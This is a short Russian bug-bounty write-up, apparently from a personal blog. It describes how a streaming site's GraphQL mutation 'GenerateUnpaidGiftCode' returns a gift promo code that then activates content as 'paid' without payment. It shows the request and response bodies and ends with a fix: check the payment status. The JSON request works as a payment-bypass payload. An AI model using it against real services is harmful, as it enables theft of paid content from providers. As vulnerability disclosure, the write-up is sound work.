---
title: "Смотреть бесплано без регистрации"
date: 2023-12-25
description: "Получение промокода в процессе покупки его без оплаты из-за ошибки валидации"
tags: ["graphql"]
categories: ["BugBounty"]
draft: false
slug: "promode_error"
---

# {{< param "title" >}}

Сервис позволяет купить промокод в качестве подарка и активировать его, получив контент.

В процессе оплаты происходит graphql-запрос:
```
https://site/api/graphql
```

Само тело запроса содержит мутацию - GenerateUnpaidGiftCode (судя по названию промокод должен был неоплачен):
```json
{
  "query": "\n    mutation GenerateUnpaidGiftCode($contentId: String!) 
           {\n    generateUnpaidGiftCode(contentId: $contentId)\n}\n    ",
  "variables": {
    "contentId": "823"
  }
}
```

И ответ - сам промод `K1mVbcFv` :

```json
{
  "data": {
    "generateUnpaidGiftCode": "K1mVbcFv"
  }
}
```

Однако, при попытке активировать промокод - мы получаем ответ с успешной оплате `paid`
```json
{
  "data": {
    "result": "paid",
    "content": [
        {
        "contentId": "823",
        "play": true
        }
    ]
  }
}
```

## Решение

Необходимо проверять не только промокод но и статус `paid` от платежной системы.